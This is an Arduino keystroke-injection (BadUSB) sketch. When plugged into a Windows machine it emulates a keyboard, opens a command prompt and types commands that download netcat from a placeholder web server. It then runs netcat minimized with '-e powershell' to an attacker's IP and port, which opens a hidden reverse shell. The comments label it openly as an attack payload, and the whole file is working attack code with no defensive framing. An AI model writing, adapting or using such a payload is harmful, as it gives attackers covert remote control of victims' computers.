#include<Keyboard.h>

void typeKey(int key){
    Keyboard.press(key);
    delay(50);
    Keyboard.release(key);
}

void setup() {  
  //begin keyboard stream
  Keyboard.begin();

  //init wait 500ms
  delay(500);

  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  //wait for run windows popup
  delay(100);

  Keyboard.print("cmd");
  delay(100);

  typeKey(KEY_RETURN);

  //wait for powershell popup
  delay(200);

  //dl nc payload 
  char payload[] = "cd %TEMP% & mkdir nc & cd nc & powershell /c wget 'http://<web server hosting netcat>/nc64.exe' -OutFile nc.exe";
 
  Keyboard.print(payload);
  typeKey(KEY_RETURN);

  delay(50);

  //nc payload
  //start nc.exe and minimize the window, when attacker end session the program will auto terminate
  char ncPayload[] = "START /MIN nc.exe <attacker ip> <attacker listening port> -e powershell & exit";
  
  //send reverse shell -> attacker
  Keyboard.print(ncPayload);
  typeKey(KEY_RETURN);
    
  //end keyboard stream
  Keyboard.end();
}

//this case not going to use this endless looping
void loop() {
  // put your main code here, to run repeatedly:

}
